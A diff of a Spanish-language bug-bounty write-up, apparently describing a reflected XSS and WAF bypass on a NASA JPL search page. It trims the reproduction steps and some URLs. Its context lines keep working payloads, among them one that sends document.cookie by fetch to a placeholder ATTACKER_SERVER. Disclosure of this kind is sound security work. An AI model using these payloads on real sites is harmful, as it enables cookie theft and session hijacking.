@@ -23,7 +23,6 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
   <div class="bounty-content">
     <h2>🔍 Búsqueda de cualquier cosa</h2>
     <p>Como en cualquier programa de bug bounty, lo primero que hicimos fue usar la página como lo haría cualquier usuario normal. El campo de búsqueda destacó a primera vista, por lo que decidimos probarlo.</p>
-    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></pre>
     <p>Aquí es donde nos dimos cuenta de que el valor que estábamos agregando se reflejaba en el sitio web.</p>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Search Normal.png" alt="Búsqueda Normal">
     <p>Decidimos inspeccionar cuidadosamente el código fuente del sitio web y nos dimos cuenta de que nuestra entrada estaba dentro de una función <code>console.log()</code>.</p>
@@ -42,7 +41,7 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Closing console.log.png" alt="Cerrando console.log">
 
     <h2>&#x1F9E9; Anexar Javascript (No funciona)</h2>
-    <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></pre>
+    <pre><code>pwn');alert(1)</code></pre>
     <p>Lo intentamos de nuevo, pero con texto después del punto y coma. Tras varias pruebas, no conseguimos que el punto y coma apareciera. Peor aún, todo lo que venía después del punto y coma ni siquiera se reflejaba.</p>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Where is semicollon.png" alt="¿Dónde está el punto y coma?">
 
@@ -54,8 +53,8 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <h2>💥 Primera Alerta (Funcionando)</h2>
     <p>Aunque el WAF no aceptaba la etiqueta <code>&lt;script&gt;</code>, logramos que renderizara la etiqueta <code>&lt;/script&gt;</code>, lo cual fue suficiente para llevar a cabo un ataque XSS REFLEJADO.</p>
     <pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
-    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1.png" alt="Alert 1">
+    <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Alert 1 HTML.png" alt="Alert 1 HTML">
 
     <h2>&#x1F6AB; Segunda Alerta (El Firewall bloquea)</h2>
     <p>Una vez logramos ejecutar un <code>alert()</code> en la web, quisimos ir más allá e intentar leer las cookies del usuario. El WAF continuó rechazando las solicitudes en cuanto detectaba cadenas sospechosas como <code>document.cookie</code>.</p>
@@ -73,18 +72,6 @@ official_link: "https://bugcrowd.com/submissions/4b01725e-288b-4db5-a38c-1a37f82
     <pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration.png" alt="Exploit Final">
     <img src="/assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS Search - ecco.jpl.nasa.gov - Document Cookie Fetch Exfiltration Request.png" alt="Petición de Exfiltración">
-
-    <h2>✅ Pasos para reproducir</h2>
-    <ol>
-      <li>Inicia un servidor web público (nosotros usamos Serveo exponiendo un servidor Python en localhost para esto).</li>
-      <li>Reemplaza <code>ATTACKER_SERVER</code> con la URL que te genera:
-        <pre><code>pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
-      </li>
-      <li>Visita la URL:
-        <pre><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></pre>
-      </li>
-    </ol>
-    <p>Recibirás una petición con tus <code>cookies</code> adjuntas. Puedes probarlo con otra persona para demostrar que funciona.</p>
 
     <h2>📜 Reconocimiento Oficial</h2>
     <div class="pdf-container">
